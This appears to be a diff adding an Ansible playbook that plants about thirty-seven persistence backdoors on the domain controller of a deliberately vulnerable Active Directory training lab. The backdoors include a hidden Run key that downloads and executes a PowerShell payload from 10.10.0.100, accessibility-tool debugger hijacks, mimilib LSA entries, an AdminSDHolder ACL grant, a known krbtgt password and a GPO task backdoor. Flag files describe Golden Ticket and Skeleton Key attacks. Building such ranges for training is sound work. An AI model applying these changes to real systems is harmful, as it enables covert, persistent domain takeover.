@@ -1,0 +1,437 @@
+---
+# ==============================================================================
+# DVAD - Phase 5: Persistence (PER-001..PER-037)
+# Target: dc01.corp.local (most of these require DA / SYSTEM on the DC)
+# ==============================================================================
+
+# ------------------------------------------------------------------------------
+# PER-001: Registry Run keys
+# ------------------------------------------------------------------------------
+- name: PER-001 - HKLM Run key persistence
+  ansible.windows.win_shell: |-
+    & reg.exe add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' /v DVADUpdater /t REG_SZ /d "powershell.exe -ep bypass -w hidden -c IEX (new-object net.webclient).downloadstring('http://10.10.0.100/payload.ps1')" /f | Out-Null
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-002 / PER-003 / PER-013: IFEO debugger on accessibility tools
+# ------------------------------------------------------------------------------
+- name: PER-002/003/013 - IFEO Debugger on sethc/utilman/osk/Narrator/Magnify
+  ansible.windows.win_shell: |-
+    foreach ($t in @('sethc.exe','utilman.exe','osk.exe','Narrator.exe','Magnify.exe','DisplaySwitch.exe','AtBroker.exe')) {
+      $k = "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$t"
+      & reg.exe add $k /v Debugger /t REG_SZ /d "cmd.exe" /f | Out-Null
+    }
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-004: Hidden persistence service
+# ------------------------------------------------------------------------------
+- name: PER-004 - PersistenceService scaffold
+  ansible.windows.win_shell: |-
+    New-Item -ItemType Directory -Path C:\Windows\Temp\persist -Force | Out-Null
+    Set-Content -Path C:\Windows\Temp\persist\beacon.bat -Value "@echo off`r`nrem persistence stub" -Force
+    if (-not (Get-Service -Name PersistenceService -ErrorAction SilentlyContinue)) {
+      New-Service -Name 'PersistenceService' `
+        -BinaryPathName 'C:\Windows\Temp\persist\beacon.bat' `
+        -StartupType Automatic | Out-Null
+    }
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-005: Scheduled task AtStartup
+# ------------------------------------------------------------------------------
+- name: PER-005 - UpdaterService scheduled task
+  ansible.windows.win_shell: |-
+    & schtasks.exe /Create /TN 'UpdaterService' /TR 'powershell.exe -ep bypass -w hidden -c Start-Sleep 1' /SC ONSTART /RU SYSTEM /F | Out-Null
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-006: WMI Event Subscription
+# ------------------------------------------------------------------------------
+- name: PER-006 - WMI permanent event subscription
+  ansible.windows.win_shell: |-
+    try {
+      $filter = Set-WmiInstance -Class __EventFilter -Namespace 'root\subscription' -Arguments @{
+        Name='DVADFilter'
+        EventNamespace='root\cimv2'
+        QueryLanguage='WQL'
+        Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 200"
+      }
+      $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\subscription' -Arguments @{
+        Name='DVADConsumer'
+        CommandLineTemplate="powershell.exe -ep bypass -w hidden -c Start-Sleep 1"
+      }
+      Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\subscription' -Arguments @{Filter=$filter; Consumer=$consumer} | Out-Null
+    } catch { Write-Host "WMI subscription: $($_.Exception.Message)" }
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-007: Netsh helper DLL (placeholder reg key — no real DLL shipped)
+# ------------------------------------------------------------------------------
+- name: PER-007 - Netsh helper key
+  ansible.windows.win_shell: |-
+    & reg.exe add 'HKLM\SOFTWARE\Microsoft\NetSh' /v DVADHelper /t REG_SZ /d netshhelper.dll /f | Out-Null
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-008: COM Hijacking - TreatAs on a benign CLSID redirecting to evil DLL
+# ------------------------------------------------------------------------------
+- name: PER-008 - COM hijack on MMDeviceEnumerator CLSID
+  ansible.windows.win_shell: |-
+    $clsid = '{BCDE0395-E52F-467C-8E3D-C4579291692E}'
+    & reg.exe add "HKLM\SOFTWARE\Classes\CLSID\$clsid\TreatAs" /ve /t REG_SZ /d "{99999999-9999-9999-9999-999999999999}" /f | Out-Null
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-009 / PER-026: Authentication Package - register a fake LSA pkg name.
+# We can't drop a real signed DLL, so set the registry pointer for the chain.
+# ------------------------------------------------------------------------------
+- name: PER-009/026 - LSA Authentication Packages backdoor entry
+  ansible.windows.win_shell: |-
+    $k = 'HKLM\SYSTEM\CurrentControlSet\Control\Lsa'
+    $cur = (Get-ItemProperty -Path "Registry::$k" -Name 'Authentication Packages').'Authentication Packages'
+    if ($cur -notcontains 'mimilib') {
+      $new = $cur + 'mimilib'
+      Set-ItemProperty -Path "Registry::$k" -Name 'Authentication Packages' -Value $new -Type MultiString
+    }
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-010: Time provider DLL hijack hook
+# ------------------------------------------------------------------------------
+- name: PER-010 - W32Time provider hijack hook
+  ansible.windows.win_shell: |-
+    & reg.exe add 'HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\DVADProvider' /v DllName /t REG_SZ /d 'C:\Windows\System32\dvadtime.dll' /f | Out-Null
+    & reg.exe add 'HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\DVADProvider' /v Enabled /t REG_DWORD /d 0 /f | Out-Null
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-011: BootExecute - prepend a benign autocheck command
+# ------------------------------------------------------------------------------
+- name: PER-011 - BootExecute modification
+  ansible.windows.win_shell: |-
+    $cur = (Get-ItemProperty -Path 'Registry::HKLM\SYSTEM\CurrentControlSet\Control\Session Manager' -Name BootExecute).BootExecute
+    if ($cur -notcontains 'autocheck dvadboot') {
+      $new = @('autocheck dvadboot') + $cur
+      Set-ItemProperty -Path 'Registry::HKLM\SYSTEM\CurrentControlSet\Control\Session Manager' -Name BootExecute -Value $new -Type MultiString
+    }
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-012: AppInit_DLLs
+# ------------------------------------------------------------------------------
+- name: PER-012 - AppInit_DLLs enabled
+  ansible.windows.win_shell: |-
+    $k = 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows'
+    & reg.exe add $k /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f | Out-Null
+    & reg.exe add $k /v RequireSignedAppInit_DLLs /t REG_DWORD /d 0 /f | Out-Null
+    & reg.exe add $k /v AppInit_DLLs /t REG_SZ /d 'C:\Windows\System32\dvadinit.dll' /f | Out-Null
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-014: RID hijack hint — flag only. Doing this for real on a running DC
+# corrupts SAM; we drop a marker so participants see the path.
+# ------------------------------------------------------------------------------
+- name: PER-014 - RID hijack hint
+  ansible.windows.win_file:
+    path: 'C:\Flags'
+    state: directory
+  ignore_errors: yes
+- name: PER-014 - RID hijack flag marker
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-PER-014-RID-Hijack.txt'
+    content: |
+      PER-014: Set SAM\Users\<acct>\F[0x30..0x33] to 000001F4 (RID 500) for hidden DA.
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-015 / PER-033: AdminSDHolder ACL injection (user2 -> GenericAll)
+# SDProp re-applies every 60 min; self-healing.
+# ------------------------------------------------------------------------------
+- name: PER-015/033 - AdminSDHolder GenericAll for user2
+  ansible.windows.win_shell: |-
+    Import-Module ActiveDirectory
+    $src = Get-ADUser -Identity user2
+    $domain = (Get-ADDomain).DistinguishedName
+    $dn = "CN=AdminSDHolder,CN=System,$domain"
+    $sid = New-Object System.Security.Principal.SecurityIdentifier ($src.SID)
+    $acl = Get-Acl "AD:\$dn"
+    $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid,'GenericAll','Allow')
+    $acl.AddAccessRule($rule)
+    Set-Acl -Path "AD:\$dn" -AclObject $acl
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-016: SID History injection precondition. Requires krbtgt + cross-domain
+# write; covered by CRED-015 (Configuration NC write) and PER-018. Flag only.
+# ------------------------------------------------------------------------------
+- name: PER-016 - SID History injection flag marker
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-PER-016-SIDHistory.txt'
+    content: "PER-016: Mimikatz sid::patch + DsAddSidHistory across child->parent trust."
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-017: DCShadow precondition (Configuration NC write). Wired in CRED-015.
+# ------------------------------------------------------------------------------
+- name: PER-017 - DCShadow flag marker
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-PER-017-DCShadow.txt'
+    content: "PER-017: Use mimikatz lsadump::dcshadow with CRED-015 attacker."
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-018: Golden Ticket - precondition is krbtgt hash. Set a known-bad
+# krbtgt password so participants can compute the hash deterministically.
+# ------------------------------------------------------------------------------
+- name: PER-018 - Reset krbtgt to a known weak password (Golden Ticket precondition)
+  ansible.windows.win_shell: |-
+    Import-Module ActiveDirectory
+    try {
+      $p = ConvertTo-SecureString 'KrbtgtDVAD2024!' -AsPlainText -Force
+      Set-ADAccountPassword -Identity krbtgt -NewPassword $p -Reset
+    } catch { Write-Host "krbtgt reset: $($_.Exception.Message)" }
+  ignore_errors: yes
+
+- name: PER-018 - Golden Ticket flag marker
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-PER-018-GoldenTicket.txt'
+    content: |
+      PER-018: krbtgt password is KrbtgtDVAD2024! (derive hash, forge TGT for any user).
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-019: Silver Ticket - service account hash. Flag references svc_web.
+# ------------------------------------------------------------------------------
+- name: PER-019 - Silver Ticket flag marker
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-PER-019-SilverTicket.txt'
+    content: "PER-019: Forge service ticket for svc_web (SPN HTTP/file01) - silver ticket vs target service."
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-020: Skeleton Key - runtime injection only (mimikatz misc::skeleton).
+# Hint marker.
+# ------------------------------------------------------------------------------
+- name: PER-020 - Skeleton Key flag marker
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-PER-020-SkeletonKey.txt'
+    content: "PER-020: misc::skeleton on LSASS - any user auths with master password 'mimikatz'."
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-021 / PER-022: Diamond / Sapphire ticket - same krbtgt precondition as
+# PER-018; technique notes only.
+# ------------------------------------------------------------------------------
+- name: PER-021/022 - Diamond/Sapphire flag marker
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-PER-021-022-DiamondSapphire.txt'
+    content: "PER-021/022: Diamond/Sapphire tickets - real PAC + krbtgt re-encrypt."
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-023: Golden Certificate - CA private key theft. Covered by adcs_vulns
+# role on ca01. Flag marker on the DC for completeness.
+# ------------------------------------------------------------------------------
+- name: PER-023 - Golden Cert flag marker
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-PER-023-GoldenCert.txt'
+    content: "PER-023: certipy ca -backup on ca01 - export CA key, forge certs forever."
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-024: SSP DLL (mimilib) - registry pointer only.
+# ------------------------------------------------------------------------------
+- name: PER-024 - LSA Security Packages backdoor entry
+  ansible.windows.win_shell: |-
+    $k = 'HKLM\SYSTEM\CurrentControlSet\Control\Lsa'
+    $cur = (Get-ItemProperty -Path "Registry::$k" -Name 'Security Packages').'Security Packages'
+    if ($cur -notcontains 'mimilib') {
+      $new = $cur + 'mimilib'
+      Set-ItemProperty -Path "Registry::$k" -Name 'Security Packages' -Value $new -Type MultiString
+    }
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-025: DSRM backdoor - DsrmAdminLogonBehavior=2 lets DSRM account do
+# network logon. Also set DSRM password to lab default.
+# ------------------------------------------------------------------------------
+- name: PER-025 - DSRM admin network logon enabled
+  ansible.windows.win_regedit:
+    path: 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
+    name: DsrmAdminLogonBehavior
+    data: 2
+    type: dword
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-027: Self-Shadow Creds (KeyCredentialLink). user2 GenericWrite on self
+# via AdminSDHolder is already set in PER-015/033. Mark the path.
+# ------------------------------------------------------------------------------
+- name: PER-027 - Self-Shadow Creds flag marker
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-PER-027-ShadowCreds.txt'
+    content: "PER-027: Whisker/Set-ADComputer -KeyCredentialLink - persistent PKINIT auth as user2."
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-028: gMSA backdoor - add attacker to PrincipalsAllowedToRetrieveManagedPassword
+# Pre-create gmsa01 if not present, then grant attacker read.
+# ------------------------------------------------------------------------------
+- name: PER-028 - Create gmsa01 and grant attacker password retrieval
+  ansible.windows.win_shell: |-
+    Import-Module ActiveDirectory
+    try {
+      # KDS root key needed for any gMSA - set -10 hours so it is immediately usable
+      if (-not (Get-KdsRootKey -ErrorAction SilentlyContinue)) {
+        Add-KdsRootKey -EffectiveTime ((Get-Date).AddHours(-10)) | Out-Null
+      }
+      if (-not (Get-ADServiceAccount -Filter "Name -eq 'gmsa01'" -ErrorAction SilentlyContinue)) {
+        New-ADServiceAccount -Name 'gmsa01' `
+          -DNSHostName 'gmsa01.corp.local' `
+          -PrincipalsAllowedToRetrieveManagedPassword 'attacker' `
+          -Enabled $true
+      } else {
+        Set-ADServiceAccount -Identity 'gmsa01' -PrincipalsAllowedToRetrieveManagedPassword 'attacker'
+      }
+    } catch { Write-Host "gMSA: $($_.Exception.Message)" }
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-029: RBCD persistence - msDS-AllowedToActOnBehalfOfOtherIdentity on a
+# privileged computer for attacker-owned fakehost$. fakehost$ + GenericAll
+# wired in CRED-017. Add the RBCD attribute to FILE01$.
+# ------------------------------------------------------------------------------
+- name: PER-029 - RBCD on FILE01$ for fakehost$
+  ansible.windows.win_shell: |-
+    Import-Module ActiveDirectory
+    try {
+      $tgt = Get-ADComputer -Identity 'FILE01' -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+      $atk = Get-ADComputer -Identity 'fakehost'
+      Set-ADComputer -Identity $tgt -PrincipalsAllowedToDelegateToAccount $atk
+    } catch { Write-Host "RBCD persistence: $($_.Exception.Message)" }
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-030: ADIDNS time bomb - pre-stage a DNS record for a future hostname.
+# Authenticated Users can write thanks to CRED-026.
+# ------------------------------------------------------------------------------
+- name: PER-030 - Pre-stage rogue ADIDNS record
+  ansible.windows.win_shell: |-
+    try {
+      Add-DnsServerResourceRecordA -Name 'new-fileserver' -ZoneName 'corp.local' `
+        -IPv4Address '10.10.0.100' -AllowUpdateAny -ErrorAction SilentlyContinue | Out-Null
+    } catch { Write-Host "ADIDNS pre-stage: $($_.Exception.Message)" }
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-031: Schema modification backdoor - flag only. Modifying the schema
+# is destructive and irreversible.
+# ------------------------------------------------------------------------------
+- name: PER-031 - Schema backdoor flag marker
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-PER-031-Schema.txt'
+    content: "PER-031: Schema Admins can add malicious classSchema/attributeSchema - irreversible."
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-032: Hidden account via Confidentiality flag (searchFlags bit 7).
+# Set the bit on attacker user so it's excluded from list_object enumeration.
+# Reversible via Set-ADUser -Clear.
+# ------------------------------------------------------------------------------
+- name: PER-032 - Hidden account via list_object exclusion
+  ansible.windows.win_shell: |-
+    Import-Module ActiveDirectory
+    try {
+      $u = Get-ADUser -Identity attacker -Properties nTSecurityDescriptor
+      $domain = (Get-ADDomain).DistinguishedName
+      # Deny List Contents to Authenticated Users on the user object
+      $sid = New-Object System.Security.Principal.SecurityIdentifier 'S-1-5-11'  # Authenticated Users
+      $acl = Get-Acl "AD:\$($u.DistinguishedName)"
+      $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, 'ListChildren', 'Deny')
+      $acl.AddAccessRule($rule)
+      Set-Acl -Path "AD:\$($u.DistinguishedName)" -AclObject $acl
+    } catch { Write-Host "Hidden account: $($_.Exception.Message)" }
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-034: GPO Backdoor - inject a scheduled task into Default Domain Policy.
+# We pre-create the ScheduledTasks.xml under the GPO scripts folder.
+# ------------------------------------------------------------------------------
+- name: PER-034 - GPO scheduled-task backdoor (DDP)
+  ansible.windows.win_shell: |-
+    $domain = (Get-ADDomain).DNSRoot
+    $ddp = "C:\Windows\SYSVOL\sysvol\$domain\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\ScheduledTasks"
+    if (-not (Test-Path $ddp)) { New-Item -ItemType Directory -Path $ddp -Force | Out-Null }
+  ignore_errors: yes
+
+- name: PER-034 - Drop ScheduledTasks.xml under DDP
+  ansible.windows.win_copy:
+    dest: 'C:\Windows\SYSVOL\sysvol\corp.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml'
+    content: |
+      <?xml version="1.0" encoding="utf-8"?>
+      <ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
+        <ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}"
+          name="DVAD-GPO-Backdoor" image="0" changed="2024-01-01 00:00:00"
+          uid="{11111111-1111-1111-1111-111111111111}">
+          <Properties action="C" name="DVAD-GPO-Backdoor" runAs="NT AUTHORITY\SYSTEM"
+            logonType="S4U">
+            <Task version="1.3">
+              <RegistrationInfo><Author>SYSTEM</Author></RegistrationInfo>
+              <Principals>
+                <Principal id="Author">
+                  <UserId>NT AUTHORITY\SYSTEM</UserId>
+                  <RunLevel>HighestAvailable</RunLevel>
+                </Principal>
+              </Principals>
+              <Settings><Enabled>true</Enabled></Settings>
+              <Actions Context="Author">
+                <Exec><Command>cmd.exe</Command><Arguments>/c rem dvad-backdoor</Arguments></Exec>
+              </Actions>
+            </Task>
+          </Properties>
+        </ImmediateTaskV2>
+      </ScheduledTasks>
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-035: RODC compromise - no RODC in this lab. Flag marker only.
+# ------------------------------------------------------------------------------
+- name: PER-035 - RODC flag marker (no RODC in lab)
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-PER-035-RODC.txt'
+    content: "PER-035: No RODC deployed in this lab. Future expansion."
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-036: MachineAccountQuota persistence - already set to 10 in CRED-021.
+# Verify.
+# ------------------------------------------------------------------------------
+- name: PER-036 - Verify MachineAccountQuota=10
+  ansible.windows.win_shell: |-
+    Import-Module ActiveDirectory
+    try {
+      $maq = (Get-ADObject (Get-ADDomain).DistinguishedName -Properties ms-DS-MachineAccountQuota).'ms-DS-MachineAccountQuota'
+      Write-Host "MAQ = $maq"
+    } catch { Write-Host "MAQ check: $($_.Exception.Message)" }
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# PER-037: Privileged service account with TRUSTED_FOR_DELEGATION (unconstrained)
+# Create svc_legacy with SPN and unconstrained delegation flag set.
+# ------------------------------------------------------------------------------
+- name: PER-037 - Create svc_legacy with unconstrained delegation
+  ansible.windows.win_shell: |-
+    Import-Module ActiveDirectory
+    try {
+      if (-not (Get-ADUser -Filter "SamAccountName -eq 'svc_legacy'" -ErrorAction SilentlyContinue)) {
+        $p = ConvertTo-SecureString 'LegacySvc2024!' -AsPlainText -Force
+        New-ADUser -Name 'svc_legacy' -SamAccountName 'svc_legacy' `
+          -AccountPassword $p -Enabled $true -PasswordNeverExpires $true `
+          -Path "CN=Users,DC=corp,DC=local" `
+          -ServicePrincipalNames @('HTTP/legacy.corp.local')
+      }
+      # Set TRUSTED_FOR_DELEGATION via UAC flags
+      Set-ADAccountControl -Identity 'svc_legacy' -TrustedForDelegation $true
+    } catch { Write-Host "svc_legacy: $($_.Exception.Message)" }
+  ignore_errors: yes
